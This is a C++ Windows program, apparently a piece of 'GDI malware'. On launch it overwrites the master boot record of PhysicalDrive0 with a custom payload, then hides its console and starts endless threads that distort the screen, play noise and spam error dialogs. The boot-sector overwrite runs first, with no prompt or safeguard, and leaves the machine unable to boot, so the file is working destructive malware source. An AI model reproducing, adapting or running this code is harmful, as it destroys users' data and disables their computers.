#include <windows.h>
#include <time.h>
#include <math.h>
#include <vector>
#include <random>
#include <iostream>
#include <mmsystem.h>

#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "winmm.lib")

HDC dc = GetDC(NULL);
HDC dcCopy = CreateCompatibleDC(dc);
int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);

typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;

namespace Colors
{
    HSL rgb2hsl(RGBQUAD rgb)
    {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f)
        {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl)
    {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f)
        {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant)
            {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }


}

namespace ByteBeats {
    DWORD WINAPI ByteBeatsThread(LPVOID lpvd) {
        DWORD counter = 44000;
        DWORD d = 0;
        DWORD c = 0;
        BOOL statement = TRUE;

        HWAVEOUT hWaveOut = 0;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) return 0x01;

        const int bufferSize = 17000 * 60;
        BYTE* sbuffer = new BYTE[bufferSize];

        while (true) {
            for (DWORD t = 0; t < bufferSize; t++) {
                if (c == counter) {
                    if (statement) {
                        d++; if (d == 40) statement = FALSE;
                    }
                    else {
                        d--; if (d == 0) statement = TRUE;
                    }
                    if (counter == 200) d = rand() % 370;
                    if (counter > 3000) counter -= 1000;
                    else if (counter <= 1000) counter -= 90;
                    if (counter == 0) counter = 200;
                    c = 0;
                }
                int freq = c * (3 + ((float)d / 10.f));
                sbuffer[t] = (BYTE)(t | freq % 500);
                c++;
            }
            WAVEHDR header = { (LPSTR)sbuffer, (DWORD)bufferSize, 0, 0, 0, 0, 0, 0 };
            waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
            waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
            Sleep(31000);
            waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        }
        delete[] sbuffer;
        return 0;
    }
}

namespace Payloads {
    DWORD WINAPI Msg(LPVOID lpvd) {
        while (true) {
            MessageBoxW(NULL, L"Bad dream", L"This piece of shit", MB_OK | MB_ICONERROR);
        }
        return 0x00;
    }

    VOID OverwriteBootSector(VOID) {
        const BYTE MBR[3072] = {
            0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFA, 0x0F, 0x01, 0x16, 0x32, 0x7C, 0x0F, 0x20, 0xC0, 0x66, 0x83,
            0xC8, 0x01, 0x0F, 0x22, 0xC0, 0xEA, 0x38, 0x7C, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
        };
        DWORD dwBytesWritten;
        HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
        if (hDrive != INVALID_HANDLE_VALUE) {
            WriteFile(hDrive, MBR, 3072, &dwBytesWritten, NULL);
            CloseHandle(hDrive);
        }
    }
}

// JPEG COMPRESSION
DWORD WINAPI JPEGCOMP(LPVOID lpParam) {
    while (1) {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 8;
        int hs = h / 8;

        BLENDFUNCTION blur = { 0 };
        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;

        bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        //SET OUT BLUR
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 20;

        INT i = 0;

        while (1)
        {
            StretchBlt(dcCopy, rand() % 1, rand() % 1, ws, hs, dc, rand() % -1, rand() % -1, w, h, SRCCOPY);

            for (int x = 0; x < ws; x++)
            {
                for (int y = 0; y < hs; y++)
                {
                    int index = y * ws + x;

                    rgbquad[index].rgbRed += i;
                    rgbquad[index].rgbGreen += i;
                    rgbquad[index].rgbBlue += i;
                }
            }

            i++;

            Sleep(rand() % 500);
            AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, blur);
        }

        return 0x00;
    }
}

// SHAKE
DWORD WINAPI SHAKE(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 12, rand() % 12, w, h, hdc, rand() % 12, rand() % 12, SRCCOPY);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

// 3. XOR
DWORD WINAPI XOR(LPVOID lpParam) {
    Sleep(8000);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(dcCopy, bmp);

    INT i = 0;

    while (1)
    {
        StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                FLOAT fx = (x + i) ^ (y + i);

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
    }

    return 0x00;
};

// CHAOS
DWORD WINAPI GDICHAOS(LPVOID lpParam) {
    Sleep(20000);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;

    bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(dcCopy, bmp);

    INT i = 100;
    INT j = 4;

    while (1)
    {
        SetStretchBltMode(dc, COLORONCOLOR);
        SetStretchBltMode(dcCopy, COLORONCOLOR);

        StretchBlt(dcCopy, rand() % 3, rand() % 3, w / j, h / j, dc, rand() % 3, rand() % 3, w, h, SRCCOPY);

        INT k = rand() % 15;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                if (k < 5)
                {
                    rgbquad[index].rgbRed += rand() % (i + 1);
                    rgbquad[index].rgbGreen += 0;
                    rgbquad[index].rgbBlue += 0;
                }

                if (k >= 5 && k <= 10)
                {
                    rgbquad[index].rgbRed += 0;
                    rgbquad[index].rgbGreen += rand() % (i + 1);
                    rgbquad[index].rgbBlue += 0;
                }

                if (k > 10 && k <= 15)
                {
                    rgbquad[index].rgbRed += 0;
                    rgbquad[index].rgbGreen += 0;
                    rgbquad[index].rgbBlue += rand() % (i + 1);
                }
            }
        }

        i++;

        StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w / j, h / j, SRCCOPY);

        Sleep(rand() % 50);

        if (rand() % 25 == 24)
        {
            StretchBlt(dc, 50, 50, w - 100, h - 100, dc, 0, 0, w, h, SRCCOPY);
            StretchBlt(dc, 50, 50, w - 100, h - 100, dc, 0, 0, w, h, SRCCOPY);
            StretchBlt(dc, 50, 50, w - 100, h - 100, dc, 0, 0, w, h, SRCCOPY);
        }
    }

    return 0x00;
};

// BALL
DWORD WINAPI BALL(LPVOID lpParam) {
    Sleep(40000);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    while (1) {
        HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
        int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y;
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 2, rand() % 255));
        SelectObject(hdc, brush);
        Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
            signY = -1;
        }

        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }

        if (y == 0)
        {
            signY = 1;
        }

        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

// BRIGHT
DWORD WINAPI BRIGHT(LPVOID lpParam) {
    while (1) {
        Sleep(40000);
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(0);
        BitBlt(hdc, rand() % 2, rand() % 10, w, h, hdc, rand() % 2, rand() % 10, SRCPAINT);
        Sleep(10);
    }
}

// PLASMA
DWORD WINAPI PLASMA(LPVOID lpParam) {
    while (1) {
        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;

        bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 0;

        while (1)
        {
            StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY);

            RGBQUAD rgbquadCopy;

            for (int x = 0; x < w; x++)
            {
                for (int y = 0; y < h; y++)
                {
                    int index = y * w + x;
                    int j = 4 * i;

                    int fx = (int)(j + (j * sin(x / 16.0)) + j + (j * sin(y / 8.0)) + j + (j * sin((x + y) / 16.0)) + j + (j * sin(sqrt((double)(x * x + y * y)) / 8.0))) / 4;

                    rgbquadCopy = rgbquad[index];

                    hslcolor = Colors::rgb2hsl(rgbquadCopy);
                    hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }

            i++;
            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
        }

        return 0x00;
    }
}


// WAVE
DWORD WINAPI WAVE(LPVOID lpParam) {
    srand(static_cast<unsigned int>(time(0)));
    HDC desk;
    int x, t, sw, sh;
    while (true) {
        desk = GetDC(0);
        sw = GetSystemMetrics(SM_CXSCREEN);
        sh = GetSystemMetrics(SM_CYSCREEN);
        t = (rand() % sh);
        x = (rand() % 5);
        if (x == 0) {
            StretchBlt(desk, 2, t, sw + 4, t, desk, 0, t, sw, t, SRCCOPY);
        }
        else if (x == 1) {
            StretchBlt(desk, 0, t, sw, t, desk, 2, t, sw + 4, t, SRCCOPY);
        };
    };
}

// ICONS
DWORD WINAPI ICONS(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    LPCWSTR icons[] = { IDI_APPLICATION, IDI_HAND, IDI_QUESTION, IDI_EXCLAMATION, IDI_ASTERISK, IDI_WINLOGO, IDI_SHIELD };

    double angle = 0;
    int radius = 100;

    while (true) {
        HDC hdc = GetDC(NULL);

        POINT cursor;
        GetCursorPos(&cursor);

        int x = cursor.x + (int)(cos(angle) * radius);
        int y = cursor.y + (int)(sin(angle) * radius);

        HICON hIcon = LoadIcon(NULL, icons[rand() % 7]);

        DrawIcon(hdc, x, y, hIcon);

        angle += 0.5;

        radius = 100 + (int)(sin(angle * 0.1) * 50);

        ReleaseDC(NULL, hdc);

        Sleep(10);

        if (rand() % 100 == 99) {
            InvalidateRect(NULL, NULL, TRUE);
        }
    }

    return 0;
}

// RGB
DWORD WINAPI COLORRGB(LPVOID lpParam) {
    while (1) {
        Sleep(50000);
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, bm);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        POINT pt[3];
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, rand() % 2, rand() % 2, sw, sh, hdcMem, rand() % 2, rand() % 2, 0x123456);
        DeleteObject(brush);
        DeleteObject(hdcMem); DeleteObject(bm);
        ReleaseDC(0, hdc);
        Sleep(1);
    }
}

int main() {
    Payloads::OverwriteBootSector();

    srand(time(NULL));
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    CreateThread(NULL, 0, JPEGCOMP, NULL, 0, NULL);
    CreateThread(NULL, 0, SHAKE, NULL, 0, NULL);
    CreateThread(NULL, 0, XOR, NULL, 0, NULL);
    CreateThread(NULL, 0, GDICHAOS, NULL, 0, NULL);
    CreateThread(NULL, 0, BALL, NULL, 0, NULL);
    CreateThread(NULL, 0, WAVE, NULL, 0, NULL);
    CreateThread(NULL, 0, BRIGHT, NULL, 0, NULL);
    CreateThread(NULL, 0, PLASMA, NULL, 0, NULL);
    CreateThread(NULL, 0, ICONS, NULL, 0, NULL);
    CreateThread(NULL, 0, COLORRGB, NULL, 0, NULL);

    CreateThread(NULL, 0, ByteBeats::ByteBeatsThread, NULL, 0, NULL);
    CreateThread(0, 0, Payloads::Msg, 0, 0, 0);


    while (1) Sleep(1000);
    return 0;
}